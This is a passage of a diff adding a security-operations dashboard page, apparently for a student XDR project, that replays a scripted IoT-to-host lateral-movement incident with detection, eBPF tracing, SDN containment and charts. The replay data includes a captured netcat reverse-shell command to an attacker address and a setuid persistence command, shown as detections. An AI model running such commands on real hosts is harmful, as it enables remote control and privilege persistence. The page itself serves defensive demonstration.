+          </div>
+        </div>
+      </div>
+
+      <div class="card">
+        <div class="card-head"><h2>Message bus</h2><span class="eyebrow">C1 &middot; C2 &middot; C3 &middot; C4</span></div>
+        <div class="card-body flush">
+          <div class="stream" id="stream">
+            <div class="ev"><div class="ev-t">0.00</div><div class="ev-c">&mdash;</div>
+              <div class="ev-body"><div class="ev-title">Waiting for replay. Press <b>Play incident</b>.</div>
+              <div class="ev-topic">no traffic</div></div></div>
+          </div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <section class="analytics" aria-label="Detection and overhead evidence">
+    <div class="card">
+      <div class="card-head"><h2>Tracing depth over the incident</h2><span class="eyebrow">C1</span></div>
+      <div class="card-body">
+        <svg class="plot" id="plot-duty" viewBox="0 0 420 190" role="img" aria-label="Step area chart of the share of tracked processes in deep tracing mode over the incident, peaking at 10.8 percent and returning to zero after the lease expires."></svg>
+        <p class="chart-note">Share of tracked processes in deep mode. Zero through the benign window &mdash; the agent
+          only pays for depth after C3&rsquo;s E(t) arrives, and decays back on its own.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-head"><h2>Mode-switch latency vs budget</h2><span class="eyebrow">measured</span></div>
+      <div class="card-body">
+        <svg class="plot" id="plot-lat" viewBox="0 0 420 190" role="img" aria-label="Bar chart of mode-switch latency: kprobe attach 12.38 ms mean, kprobe detach 176.71 ms mean, pid map update 0.01 ms, all against a 500 ms budget."></svg>
+        <p class="chart-note">WSL2 kernel 6.18.33.2, n=30. Detach is the expensive direction &mdash; unregistering a
+          kprobe waits out an RCU grace period. Quote <b>2.6&times; headroom</b>, not the attach figure.</p>
+      </div>
+    </div>
+
+    <div class="card">
+      <div class="card-head"><h2>IoT model under identifier drift</h2><span class="eyebrow">C2</span></div>
+      <div class="card-body">
+        <div class="legend">
+          <span><span class="swatch" style="background:var(--s1)"></span>Set A &mdash; identifier-inclusive</span>
+          <span><span class="swatch" style="background:var(--s2)"></span>Set B &mdash; behavioural only</span>
+        </div>
+        <svg class="plot" id="plot-c2" viewBox="0 0 420 190" role="img" aria-label="Grouped bar chart of F1 by test: on clean data Set A scores 1.00 and Set B 0.83; under perturbed identifiers Set A falls to 0.36 while Set B holds at 0.83; on transfer Set A scores 0.23 and Set B 0.84."></svg>
+        <p class="chart-note">Identifiers an attacker controls are excluded before feature selection. Set A collapses
+          when they are perturbed (&minus;0.64 F1); Set B does not move.</p>
+      </div>
+    </div>
+  </section>
+
+  <section class="card prov">
+    <div class="card-head"><h2>Data provenance &mdash; what is measured, what is not</h2><span class="eyebrow">read before quoting any figure</span></div>
+    <div class="card-body">
+      <table>
+        <thead><tr><th>Figure on this console</th><th>Status</th><th>Where it comes from</th></tr></thead>
+        <tbody>
+          <tr><td>kprobe attach / detach / map update latency</td><td><span class="badge measured">measured</span></td>
+              <td>Timed in the libbpf loader with <span class="mono">CLOCK_MONOTONIC</span>, WSL2 kernel 6.18.33.2, n=30.</td></tr>
+          <tr><td>Replay switch latency (13.741 ms attach)</td><td><span class="badge modelled">modelled</span></td>
+              <td><span class="mono">SimulatedBackend</span> cost model, seeded from the measured medians. The agent reports <span class="mono">latency_source: modelled</span> on this run.</td></tr>
+          <tr><td>Duty cycle, mode switches, suppression counts</td><td><span class="badge measured">measured</span></td>
+              <td>Real accounting inside <span class="mono">C1Agent.stats()</span> over the scripted event stream.</td></tr>
+          <tr><td>IoT flows and verdicts</td><td><span class="badge synthetic">synthetic</span></td>
+              <td>TON_IoT-structured flows, not TON_IoT itself. The T1/T2/T3 protocol and the GBDT model are real.</td></tr>
+          <tr><td>C3 correlation and GNN baseline</td><td><span class="badge synthetic">synthetic</span></td>
+              <td>GraphSAGE autoencoder trained on this run&rsquo;s own benign window, not a full dataset.</td></tr>
+          <tr><td>SDN flow rules</td><td><span class="badge modelled">modelled</span></td>
+              <td><span class="mono">dry_run=True</span> &mdash; exact <span class="mono">ovs-ofctl</span> commands are printed, not executed. Set <span class="mono">dry_run=False</span> against a real bridge.</td></tr>
+        </tbody>
+      </table>
+    </div>
+  </section>
+
+  <p class="foot">
+    LAAX &mdash; Lightweight Agent-Based &amp; Agentless XDR for Hybrid Enterprise-IoT Environments &middot; project J26-CS-310.
+    This console is the analyst-facing surface over the four implemented components: <b>C1</b> adaptive eBPF agent,
+    <b>C2</b> agentless IoT flow classifier, <b>C3</b> cross-domain correlation engine, <b>C4</b> graduated containment
+    controller. Every panel is populated from the message contracts in <span class="mono">laax/contracts.py</span>;
+    the replay is the <span class="mono">lateral_movement</span> scenario, seed 4.
+  </p>
+</div>
+
+<div class="tip" id="tip" role="status" aria-live="off"></div>
+<div class="toast" id="toast" role="status" aria-live="polite"></div>
+
+<script>
+"use strict";
+
+/* ------------------------------------------------------------------
+   The replay. Every entry below is an actual message from the
+   lateral_movement scenario (seed 4), in the order the bus carried it.
+------------------------------------------------------------------- */
+const EVENTS = [
+  {t:0.00, c:"C1", topic:"host.event",   k:"", title:"Baseline frozen — 8 lineage pairs, 4 egress pairs over 90 benign events"},
+  {t:0.06, c:"C3", topic:"corr.baseline",k:"", title:"GNN baseline trained on benign graph, reconstruction loss 0.00013"},
+  {t:1.20, c:"C2", topic:"iot.flow.verdict", k:"crit", title:"MALICIOUS — iot-07 → 10.0.0.12:22, p=0.984 (set B, truth=scanning)", verdict:true},
+  {t:1.34, c:"C3", topic:"corr.alert", k:"crit", title:"CORRELATED conf=0.990 — chain iot → ip → sock → sshd", alert:1},
+  {t:1.35, c:"C4", topic:"resp.action", k:"act", title:"sdn$ ovs-ofctl add-flow br0 priority=800,ip,nw_src=66.42.13.90,actions=drop,hard_timeout=6"},
+  {t:1.36, c:"C4", topic:"resp.action", k:"act", title:"LEVEL 3 ISOLATE target=iot-07 [standard] lease=6s", contain:true},
+  {t:1.40, c:"C3", topic:"corr.external", k:"act", title:"E(t) → C1: pid 1400 confidence 2.84 → 8.84 (cross-domain path from iot-07)"},
+  {t:1.42, c:"C1", topic:"host.mode", k:"crit", title:"pid 1400 (sshd) light → DEEP, conf=8.84, kprobe attach 13.741 ms",
+    deep:{pid:1400, comm:"sshd", argv:null, conf:"8.84", trig:"external_alert", sw:"13.741 ms attach"}},
+  {t:1.45, c:"C1", topic:"resp.enforce.host", k:"crit", title:"LSM ARMED — deny execve for pid 1400 (0.011 ms, lease 6s, policy bd1479261c7e)", lsm:true},
+  {t:1.60, c:"C1", topic:"host.mode", k:"", title:"pid 4471 (bash) light → DEEP, conf=6.19, inherited from parent subtree",
+    deep:{pid:4471, comm:"bash", argv:"/bin/bash -i", conf:"6.19", trig:"inherited", sw:"0.011 ms map"}},
+  {t:1.72, c:"C1", topic:"host.mode", k:"", title:"pid 4472 (whoami) light → DEEP, conf=6.51, inherited",
+    deep:{pid:4472, comm:"whoami", argv:"/usr/bin/whoami", conf:"6.51", trig:"inherited", sw:"0.011 ms map"}},
+  {t:1.81, c:"C1", topic:"host.mode", k:"", title:"pid 4473 (uname) light → DEEP, conf=6.51, inherited",
+    deep:{pid:4473, comm:"uname", argv:"/bin/uname -a", conf:"6.51", trig:"inherited", sw:"0.011 ms map"}},
+  {t:1.95, c:"C1", topic:"host.mode", k:"crit", title:"pid 4474 (nc) light → DEEP — reverse shell argv now visible",
+    deep:{pid:4474, comm:"nc", argv:"/bin/nc -e /bin/bash 66.42.13.90 4444", conf:"6.51", trig:"inherited", sw:"0.011 ms map"}},
+  {t:2.05, c:"C1", topic:"host.mode", k:"", title:"pid 4475 (nc) light → DEEP, conf=6.51, inherited",
+    deep:{pid:4475, comm:"nc", argv:null, conf:"6.51", trig:"inherited", sw:"0.011 ms map"}},
+  {t:2.10, c:"C3", topic:"corr.alert", k:"crit", title:"CORRELATED conf=0.990 — chain iot → ip → sock → nc (pid 4475)", alert:2},
+  {t:2.12, c:"C4", topic:"resp.action", k:"", title:"iot-07 already contained at level 3 (isolate) — alert absorbed, lease unchanged"},
+  {t:2.14, c:"C3", topic:"corr.external", k:"act", title:"E(t) → C1: pid 4475 confidence 9.35 → 15.35"},
+  {t:2.30, c:"C1", topic:"host.mode", k:"crit", title:"pid 4480 (chmod) light → DEEP — setuid persistence attempt captured",
+    deep:{pid:4480, comm:"chmod", argv:"/bin/chmod u+s /tmp/.x", conf:"6.51", trig:"inherited", sw:"0.011 ms map"}},
+  {t:7.36, c:"C1", topic:"host.mode", k:"good", title:"7 processes DEEP → light on confidence decay, kprobe detach 174.811 ms", decay:true},
+  {t:7.40, c:"C1", topic:"resp.enforce.host", k:"good", title:"LSM RELEASED — execve allowed again for pid 1400", lsmoff:true},
+  {t:7.44, c:"C4", topic:"resp.rollback", k:"good", title:"sdn$ ovs-ofctl del-flows br0 ip,nw_src=66.42.13.90"},
+  {t:7.46, c:"C4", topic:"resp.rollback", k:"good", title:"ROLLBACK isolate on iot-07 (lease_expired) — connectivity restored", rollback:"lease_expired"}
+];
+
+const PHASES = [
+  {name:"benign baseline", from:0,    to:1.20},
+  {name:"C2 detection",    from:1.20, to:1.36},
+  {name:"contain + deep trace", from:1.36, to:2.40},
+  {name:"lease running",   from:2.40, to:7.36},
+  {name:"rollback",        from:7.36, to:8.40}
+];
+
+const TMAX = 8.4, LEASE_START = 1.36, LEASE_LEN = 6.0;
+const TOTAL_TRACKED = 65, TOTAL_EVENTS = 97, TOTAL_BUS = 120;
+
+const $ = (id) => document.getElementById(id);
+const state = {t:0, playing:false, speed:1, extended:0, closed:null, rendered:-1, incident:"INC-0042"};
+
+/* ----------------------------------------------------------------
+   The queue holds exactly what this run produced: one incident.
+   C3 raised two correlation alerts; C4 absorbed the second into the
+   lease already open on iot-07, so they are one incident, not two.
+----------------------------------------------------------------- */
+const QUEUE = [
+  {id:"INC-0042", sev:"critical", title:"IoT beachhead pivoting into host-0",
+   meta:"iot-07 → host-0 · conf 0.99"}
+];
+
+const ALERTS = [
+  {n:1, t:1.34, chain:"iot → ip → sock → sshd", proc:"pid 1400 sshd", conf:"0.990",
+   outcome:"level 3 isolate applied to iot-07", cls:"applied"},
+  {n:2, t:2.10, chain:"iot → ip → sock → nc", proc:"pid 4475 nc", conf:"0.990",
+   outcome:"absorbed — existing lease unchanged", cls:"absorbed"}
+];
+
+function renderQueue(){
+  $("queue").innerHTML = QUEUE.map((q) => (
+    '<button class="qitem" role="tab" data-id="' + q.id + '" aria-current="' + (q.id === state.incident) + '">' +
+      '<div class="qrow"><span class="qid">' + q.id + '</span>' +
+      '<span class="sev sev-' + q.sev + '"><span class="glyph">&#9679;</span>' + q.sev + '</span></div>' +
+      '<div class="qtitle">' + q.title + '</div>' +
+      '<div class="qmeta">' + q.meta + '</div>' +
+    '</button>'
+  )).join("");
+}
+
+function renderAlerts(s){
+  const shown = ALERTS.slice(0, s.alerts);
+  if (!shown.length){
+    $("alert-list").innerHTML = '<div class="alerts-empty">None yet — C3 is inside its benign window. ' +
+      'An alert appears here only when a path crosses the IoT and host domains.</div>';
+    return;
+  }
+  $("alert-list").innerHTML = shown.map((a) => (
+    '<div class="arow">' +
+      '<div class="arow-top"><span class="arow-id">alert ' + a.n + ' · t+' + a.t.toFixed(2) + 's</span>' +
+      '<span class="arow-conf">conf ' + a.conf + '</span></div>' +
+      '<div class="arow-chain">' + a.chain + '<br>' + a.proc + '</div>' +
+      '<div class="arow-out ' + a.cls + '"><span class="pip"></span>' + a.outcome + '</div>' +
+    '</div>'
+  )).join("");
+}
+
+/* ---------------- correlation path diagram ---------------- */
+function drawChain(){
+  const svg = $("chain");
+  const NS = "http://www.w3.org/2000/svg";
+  const row1 = [
+    {x:14,  w:130, label:"iot-07", sub:"IoT device · agentless", type:"C2"},
+    {x:214, w:140, label:"66.42.13.90", sub:"attacker address", type:"C3"},
+    {x:424, w:148, label:"10.0.0.12:22", sub:"socket · tcp", type:"C3"},
+    {x:642, w:140, label:"sshd", sub:"pid 1400 · host-0", type:"C1"}
+  ];
+  const row2 = [
+    {x:30,  w:104, label:"bash", sub:"pid 4471"},
+    {x:174, w:112, label:"whoami", sub:"pid 4472"},
+    {x:326, w:104, label:"uname", sub:"pid 4473"},
+    {x:470, w:104, label:"nc", sub:"pid 4474"},
+    {x:614, w:112, label:"chmod", sub:"pid 4480"}
+  ];
+  let out = "";
+
+  /* deep-tracing band behind the descendant row */
+  out += '<rect x="8" y="126" width="884" height="102" rx="8" fill="var(--crit-soft)" ' +
+         'stroke="color-mix(in srgb, var(--crit) 26%, transparent)" stroke-dasharray="3 3"></rect>';
+  out += '<text class="band" x="20" y="145">DEEP TRACING SUBTREE — ARGV VISIBLE ONLY HERE</text>';
+
+  const node = (n, y, h, accent) => {
+    const stroke = accent ? "var(--accent-line)" : "var(--line-2)";
+    const fill = accent ? "var(--accent-soft)" : "var(--surface-2)";
+    let s = '<rect x="' + n.x + '" y="' + y + '" width="' + n.w + '" height="' + h + '" rx="7" fill="' + fill + '" stroke="' + stroke + '"></rect>';
+    s += '<text class="nlabel" x="' + (n.x + 11) + '" y="' + (y + 21) + '">' + n.label + '</text>';
+    s += '<text class="nsub" x="' + (n.x + 11) + '" y="' + (y + 36) + '">' + n.sub + '</text>';
+    if (n.type){
+      s += '<rect x="' + (n.x + n.w - 30) + '" y="' + (y + 9) + '" width="22" height="14" rx="3" fill="var(--surface)" stroke="var(--line-2)"></rect>';
+      s += '<text class="nsub" x="' + (n.x + n.w - 25) + '" y="' + (y + 19.5) + '">' + n.type + '</text>';
+    }
+    return s;
+  };
+
+  const arrow = (x1, x2, y, label) => {
+    let s = '<line x1="' + x1 + '" y1="' + y + '" x2="' + (x2 - 7) + '" y2="' + y + '" stroke="var(--line-2)" stroke-width="1.5"></line>';
+    s += '<path d="M' + (x2 - 7) + ' ' + (y - 4) + ' L' + x2 + ' ' + y + ' L' + (x2 - 7) + ' ' + (y + 4) + 'Z" fill="var(--line-2)"></path>';
+    if (label) s += '<text class="ekind" x="' + ((x1 + x2) / 2) + '" y="' + (y - 8) + '" text-anchor="middle">' + label + '</text>';
+    return s;
+  };
+
+  /* row 1 */
+  out += arrow(144, 214, 82, "p=0.984");
+  out += arrow(354, 424, 82, "src addr");
+  out += arrow(572, 642, 82, "owns sock");
+  row1.forEach((n, i) => { out += node(n, 58, 48, i === 3); });
+  out += '<text class="band" x="14" y="42">C2 AGENTLESS</text>';
+  out += '<text class="band" x="424" y="42">C3 GRAPH LINK</text>';
+  out += '<text class="band" x="642" y="42">C1 AGENT-BASED</text>';
+
+  /* spine from sshd down into the subtree */
+  const spine = "color-mix(in srgb, var(--crit) 45%, transparent)";
+  out += '<path d="M712 106 L712 122 L82 122 L82 154" fill="none" stroke="' + spine + '" stroke-width="1.5"></path>';
+  out += '<path d="M670 122 L670 154" fill="none" stroke="' + spine + '" stroke-width="1.5"></path>';
+  out += '<text class="ekind" x="884" y="119" text-anchor="end">execve subtree — depth inherited</text>';
+
+  row2.forEach((n) => { out += node(n, 154, 44, false); });
+  row2.forEach((n, i) => { if (i < row2.length - 1) out += arrow(n.x + n.w, row2[i + 1].x, 176, ""); });
+
+  svg.innerHTML = out;
+  svg.setAttribute("xmlns", NS);
+}
+
+/* ---------------- derived state ---------------- */
+function stateAt(t){
+  const s = {
+    idx:0, deep:[], alerts:0, verdict:false, contained:false, rolledBack:false,
+    lsm:false, worst:0, rollbackReason:null, decayed:false, captured:0
+  };
+  for (const e of EVENTS){
+    if (e.t > t) break;
+    s.idx++;
+    if (e.deep) s.deep.push(e.deep);
+    if (e.alert) s.alerts = e.alert;
+    if (e.verdict) s.verdict = true;
+    if (e.contain){ s.contained = true; }
+    if (e.lsm) s.lsm = true;
+    if (e.lsmoff) s.lsm = false;
+    if (e.decay){ s.decayed = true; s.worst = 174.811; }
+    if (e.rollback){ s.contained = false; s.rolledBack = true; s.rollbackReason = e.rollback; }
+  }
+  if (state.closed){
+    s.contained = false; s.rolledBack = true; s.rollbackReason = state.closed;
+  }
+  if (!s.decayed && s.deep.length) s.worst = 13.741;
+  s.captured = s.deep.filter((d) => d.argv).length;
+  if (s.decayed) s.deep = [];
+  return s;
+}
+
+const leaseEnd = () => LEASE_START + LEASE_LEN + state.extended;
+function leaseLeft(t, s){
+  if (!s.contained) return 0;
+  return Math.max(0, leaseEnd() - t);
+}
+
+/* ---------------- render ---------------- */
+function render(force){
+  const t = state.t, s = stateAt(t);
+  const left = leaseLeft(t, s);
+
+  $("clock").textContent = t.toFixed(2);
+  $("evcount").textContent = s.idx;
+  $("scrub").value = t;
+  $("playhead").style.left = (t / TMAX * 100) + "%";
+  $("bus-chip").textContent = "bus " + Math.round(TOTAL_BUS * (s.idx / EVENTS.length)) + " msg";
+
+  /* phases */
+  [...$("phases").children].forEach((el, i) => {
+    el.classList.toggle("on", t >= PHASES[i].from && t < PHASES[i].to);
+  });
+
+  /* lease ring */
+  const frac = left / (LEASE_LEN + state.extended);
+  $("ring-arc").setAttribute("stroke-dashoffset", (194.8 * (1 - frac)).toFixed(1));
+  $("ring-num").textContent = s.contained ? left.toFixed(1) : "—";
+
+  /* posture tiles */
+  $("v-inc").textContent = s.alerts === 0 ? "0" : "1";
+  $("n-inc").textContent = s.alerts === 0
+    ? "baseline window — nothing correlated"
+    : s.alerts + " correlation alert" + (s.alerts > 1 ? "s" : "") + " · 1 incident · conf 0.99";
+  $("tile-inc").className = "tile " + (s.alerts ? "is-crit" : "is-good");
+
+  $("v-cont").innerHTML = s.contained
+    ? 'L3 <small>isolate</small>'
+    : (s.rolledBack ? 'clear <small>rolled back</small>' : 'none');
+  $("n-cont").textContent = s.contained
+    ? "iot-07 · lease " + left.toFixed(1) + "s remaining · sdn + ebpf"
+    : (s.rolledBack ? "connectivity restored · reason " + s.rollbackReason : "no active leases");
+  $("tile-cont").className = "tile " + (s.contained ? "is-warn" : "is-good");
+
+  const duty = s.deep.length / TOTAL_TRACKED * 100;
+  $("v-deep").innerHTML = s.deep.length + ' <small>of ' + TOTAL_TRACKED + ' processes deep</small>';
+  $("n-deep").textContent = s.deep.length
+    ? "duty cycle " + duty.toFixed(2) + "% · subtree inherited from pid 1400"
+    : "duty cycle 0.00% · light mode fleet-wide";
+  $("h-duty").textContent = duty.toFixed(2) + "%";
+  $("h-duty-bar").style.width = Math.min(100, duty * 6) + "%";
+  $("h-worst").textContent = s.worst ? s.worst.toFixed(3) + " ms" : "—";
+  $("h-lsm").innerHTML = s.lsm
+    ? '<span class="sev sev-critical"><span class="glyph">&#9632;</span>execve denied · pid 1400</span>'
+    : "disarmed";
+
+  /* C4 card */
+  $("c4-state").className = "sev " + (s.contained ? "sev-critical" : (s.rolledBack ? "sev-good" : "sev-low"));
+  $("c4-state").innerHTML = s.contained
+    ? '<span class="glyph">&#9679;</span>active'
+    : (s.rolledBack ? '<span class="glyph">&#10003;</span>rolled back' : "idle");
+  $("c4-level").textContent = s.contained ? "Level 3 · isolate" : (s.rolledBack ? "Level 0 · released" : "—");
+  $("c4-target").textContent = s.contained || s.rolledBack ? "target iot-07 · 66.42.13.90" : "no target under containment";
+  $("c4-rationale").textContent = s.contained || s.rolledBack
+    ? "high confidence 0.99 on a standard asset; isolate"
+    : "—";
+  $("c4-asset").textContent = s.contained || s.rolledBack ? "standard (iot-07)" : "—";
+  $("c4-layer").textContent = s.contained || s.rolledBack ? "sdn + ebpf LSM" : "—";
+  $("c4-policy").textContent = s.contained || s.rolledBack ? "bd1479261c7e" : "—";
+  $("c4-cmd").innerHTML = s.contained
+    ? 'sdn$ <span class="ok">ovs-ofctl add-flow br0 priority=800,\n     ip,nw_src=66.42.13.90,actions=drop,\n     hard_timeout=6</span>'
+    : (s.rolledBack
+      ? 'sdn$ <span class="undo">ovs-ofctl del-flows br0 ip,nw_src=66.42.13.90</span>\n<span class="ok">✓ rollback verified · reason ' + s.rollbackReason + '</span>'
+      : 'sdn$ <span class="undo">awaiting policy decision</span>');
+
+  $("capture-stat").textContent = s.deep.length
+    ? s.captured + " argv captured · 91 payloads suppressed in light mode"
+    : "no deep probes attached";
+  $("graph-stat").textContent = s.alerts ? "135 nodes · 242 edges · " + s.alerts + " alert" + (s.alerts > 1 ? "s" : "") : "135 nodes · 242 edges";
+  $("inc-sev").className = "sev " + (s.rolledBack ? "sev-high" : (s.alerts ? "sev-critical" : "sev-low"));
+  $("inc-sev").innerHTML = '<span class="glyph">&#9679;</span>' + (s.alerts ? (s.rolledBack ? "contained" : "critical") : "watching");
+
+  /* deep-capture table + stream, only when the event count moved */
+  if (force || s.idx !== state.rendered){
+    renderDeep(s);
+    renderStream(s);
+    renderAlerts(s);
+    state.rendered = s.idx;
+  }
+  drawDuty(t);
+}
+
+function renderDeep(s){
+  const tb = $("deep-rows");
+  if (!s.deep.length){
+    tb.innerHTML = '<tr><td colspan="6" class="empty">' +
+      (s.decayed
+        ? "All processes decayed back to light mode. Deep probes detached, argv capture off — the agent is paying the light-mode cost again."
+        : "Agent is in light mode. No argv is being captured — this is the steady state the overhead claim rests on.") +
+      "</td></tr>";
+    return;
+  }
+  tb.innerHTML = s.deep.map((d, i) => (
+    '<tr class="' + (i === s.deep.length - 1 ? "fresh" : "") + '">' +
+      '<td class="num">' + d.pid + '</td>' +
+      '<td class="num">' + d.comm + '</td>' +
+      '<td class="argv">' + (d.argv || '<span style="color:var(--ink-3)">— no exec observed while deep</span>') + '</td>' +
+      '<td class="num">' + d.conf + '</td>' +
+      '<td><span class="tag ' + (d.trig === "external_alert" ? "ext" : "deep") + '">' + d.trig + '</span></td>' +
+      '<td class="num">' + d.sw + '</td>' +
+    '</tr>'
+  )).join("");
+}
+
+function renderStream(s){
+  const st = $("stream");
+  const shown = EVENTS.slice(0, s.idx).reverse();
+  const extra = (state.log || []).slice().reverse();
+  const rows = extra.concat(shown);
+  if (!rows.length){
+    st.innerHTML = '<div class="ev"><div class="ev-t">0.00</div><div class="ev-c">—</div>' +
+      '<div class="ev-body"><div class="ev-title">Waiting for replay. Press <b>Play incident</b>.</div>' +
+      '<div class="ev-topic">no traffic</div></div></div>';
+    return;
+  }
+  st.innerHTML = rows.map((e, i) => (
+    '<div class="ev k-' + (e.k || "") + (i === 0 ? " new" : "") + '">' +
+      '<div class="ev-t">' + e.t.toFixed(2) + '</div>' +
+      '<div class="ev-c">' + e.c + '</div>' +
+      '<div class="ev-body"><div class="ev-title">' + e.title + '</div>' +
+      '<div class="ev-topic">' + e.topic + '</div></div>' +
+    '</div>'
+  )).join("");
+  st.scrollTop = 0;
+}
+
+/* ---------------- charts ---------------- */
+function dutySeries(){
+  const pts = [];
+  let n = 0;
+  for (const e of EVENTS){
+    if (e.deep) n++;
+    if (e.decay) n = 0;
+    pts.push({t:e.t, v:n / TOTAL_TRACKED * 100});
+  }
+  return pts;
+}
+
+function drawDuty(now){
+  const svg = $("plot-duty");
+  const W = 420, H = 190, L = 34, R = 10, T = 12, B = 26;
+  const pw = W - L - R, ph = H - T - B;
+  const pts = dutySeries(), vmax = 12;
+  const X = (t) => L + t / TMAX * pw;
+  const Y = (v) => T + ph - (v / vmax) * ph;
+  let out = "";
+
+  for (let g = 0; g <= 12; g += 4){
+    out += '<line class="grid" x1="' + L + '" y1="' + Y(g) + '" x2="' + (W - R) + '" y2="' + Y(g) + '"></line>';
+    out += '<text class="tick" x="' + (L - 6) + '" y="' + (Y(g) + 3.5) + '" text-anchor="end">' + g + '%</text>';
+  }
+  for (let t = 0; t <= 8; t += 2){
+    out += '<text class="tick" x="' + X(t) + '" y="' + (H - 8) + '" text-anchor="middle">' + t + 's</text>';
+  }
+
+  /* step path */
+  let d = "M" + X(0) + " " + Y(0);
+  let prev = 0;
+  for (const p of pts){
+    d += " L" + X(p.t) + " " + Y(prev) + " L" + X(p.t) + " " + Y(p.v);
+    prev = p.v;
+  }
+  d += " L" + X(TMAX) + " " + Y(prev);
+  out += '<path d="' + d + ' L' + X(TMAX) + ' ' + Y(0) + ' L' + X(0) + ' ' + Y(0) + 'Z" fill="var(--s1-fill)"></path>';
+  out += '<path d="' + d + '" fill="none" stroke="var(--s1)" stroke-width="2" stroke-linejoin="round"></path>';
+
+  /* lease band */
+  out += '<rect x="' + X(LEASE_START) + '" y="' + T + '" width="' + (X(Math.min(TMAX, leaseEnd())) - X(LEASE_START)) + '" height="' + ph + '" fill="var(--crit)" opacity="0.05"></rect>';
+  out += '<line x1="' + X(LEASE_START) + '" y1="' + T + '" x2="' + X(LEASE_START) + '" y2="' + (T + ph) + '" stroke="var(--crit)" stroke-width="1" stroke-dasharray="3 3"></line>';
+  out += '<text class="dlabel" x="' + (X(LEASE_START) + 5) + '" y="' + (T + ph - 6) + '">containment lease</text>';
+
+  /* peak label */
+  const peak = pts.reduce((a, b) => (b.v > a.v ? b : a), pts[0]);
+  out += '<circle cx="' + X(2.30) + '" cy="' + Y(peak.v) + '" r="3.5" fill="var(--s1)" stroke="var(--surface)" stroke-width="2"></circle>';
+  out += '<text class="dlabel" x="' + (X(2.30) + 8) + '" y="' + (Y(peak.v) - 4) + '">peak ' + peak.v.toFixed(1) + '% (7 procs)</text>';
+
+  /* playhead */
+  out += '<line x1="' + X(now) + '" y1="' + T + '" x2="' + X(now) + '" y2="' + (T + ph) + '" stroke="var(--ink-3)" stroke-width="1"></line>';
+  out += '<line class="axis" x1="' + L + '" y1="' + (T + ph) + '" x2="' + (W - R) + '" y2="' + (T + ph) + '"></line>';
+  svg.innerHTML = out;
+}
+
+function drawLatency(){
+  const svg = $("plot-lat");
+  const W = 420, H = 190, L = 96, R = 44, T = 20, B = 28;
+  const pw = W - L - R, ph = H - T - B;
+  const rows = [
+    {name:"kprobe detach", mean:176.71, p95:193.28, note:"RCU grace period"},
+    {name:"kprobe attach", mean:12.38,  p95:16.50,  note:"bpf_link create"},
+    {name:"pid map update", mean:0.011, p95:0.014,  note:"gate a pid"}
+  ];
+  const vmax = 500;
+  const X = (v) => L + v / vmax * pw;
+  const bh = 22, gap = (ph - rows.length * bh) / (rows.length + 1);
+  let out = "";
+
+  for (let g = 0; g <= 500; g += 125){
+    out += '<line class="grid" x1="' + X(g) + '" y1="' + T + '" x2="' + X(g) + '" y2="' + (T + ph) + '"></line>';
+    out += '<text class="tick" x="' + X(g) + '" y="' + (H - 10) + '" text-anchor="middle">' + g + '</text>';
+  }
+  out += '<text class="tick" x="' + (L + pw / 2) + '" y="' + (T - 8) + '" text-anchor="middle">milliseconds · budget 500 ms</text>';
+
+  rows.forEach((r, i) => {
+    const y = T + gap + i * (bh + gap);
+    out += '<text class="dlabel" x="' + (L - 8) + '" y="' + (y + bh / 2 + 3.5) + '" text-anchor="end">' + r.name + '</text>';
+    out += '<rect class="hot" x="' + L + '" y="' + y + '" width="' + Math.max(3, X(r.mean) - L) + '" height="' + bh + '" rx="4" fill="var(--s1)"' +
+           ' data-tip="' + r.name + '|' + r.mean.toFixed(3) + ' ms mean|p95 ' + r.p95 + ' ms · ' + r.note + '"></rect>';
+    out += '<line x1="' + X(r.p95) + '" y1="' + (y - 2) + '" x2="' + X(r.p95) + '" y2="' + (y + bh + 2) + '" stroke="var(--ink-2)" stroke-width="2"></line>';
+    out += '<text class="dlabel" x="' + (Math.max(X(r.p95), X(r.mean)) + 8) + '" y="' + (y + bh / 2 + 3.5) + '">' + r.mean.toFixed(2) + '</text>';
+  });
+
+  out += '<line x1="' + X(500) + '" y1="' + T + '" x2="' + X(500) + '" y2="' + (T + ph) + '" stroke="var(--crit)" stroke-width="2"></line>';
+  out += '<line class="axis" x1="' + L + '" y1="' + T + '" x2="' + L + '" y2="' + (T + ph) + '"></line>';
+  svg.innerHTML = out;
+  wireTips(svg);
+}
+
+function drawC2(){
+  const svg = $("plot-c2");
+  const W = 420, H = 190, L = 34, R = 10, T = 16, B = 34;
+  const pw = W - L - R, ph = H - T - B;
+  const groups = [
+    {name:"T1 clean", a:1.0000, b:0.8342},
+    {name:"T2 perturbed", a:0.3642, b:0.8342},
+    {name:"T3 transfer", a:0.2278, b:0.8373}
+  ];
+  const Y = (v) => T + ph - v * ph;
+  const gw = pw / groups.length, bw = 26;
+  let out = "";
+
+  for (let g = 0; g <= 1.0001; g += 0.25){
+    out += '<line class="grid" x1="' + L + '" y1="' + Y(g) + '" x2="' + (W - R) + '" y2="' + Y(g) + '"></line>';
+    out += '<text class="tick" x="' + (L - 6) + '" y="' + (Y(g) + 3.5) + '" text-anchor="end">' + g.toFixed(2) + '</text>';
+  }
+
+  groups.forEach((g, i) => {
+    const cx = L + gw * i + gw / 2;
+    const xa = cx - bw - 1, xb = cx + 1;
+    out += '<rect class="hot" x="' + xa + '" y="' + Y(g.a) + '" width="' + bw + '" height="' + (ph - (Y(g.a) - T)) + '" rx="4" fill="var(--s1)"' +
+           ' data-tip="Set A · ' + g.name + '|F1 ' + g.a.toFixed(4) + '|identifier-inclusive baseline"></rect>';
+    out += '<rect class="hot" x="' + xb + '" y="' + Y(g.b) + '" width="' + bw + '" height="' + (ph - (Y(g.b) - T)) + '" rx="4" fill="var(--s2)"' +
+           ' data-tip="Set B · ' + g.name + '|F1 ' + g.b.toFixed(4) + '|behavioural-only, proposed"></rect>';
+    out += '<text class="dlabel" x="' + (xa + bw / 2) + '" y="' + (Y(g.a) - 5) + '" text-anchor="middle">' + g.a.toFixed(2) + '</text>';
+    out += '<text class="dlabel" x="' + (xb + bw / 2) + '" y="' + (Y(g.b) - 5) + '" text-anchor="middle">' + g.b.toFixed(2) + '</text>';
+    out += '<text class="tick" x="' + cx + '" y="' + (H - 12) + '" text-anchor="middle">' + g.name + '</text>';
+  });
+
+  out += '<line class="axis" x1="' + L + '" y1="' + (T + ph) + '" x2="' + (W - R) + '" y2="' + (T + ph) + '"></line>';
+  out += '<text class="tick" x="' + L + '" y="' + (T - 5) + '">F1</text>';
+  svg.innerHTML = out;
+  wireTips(svg);
+}
+
+function wireTips(svg){
+  const tip = $("tip");
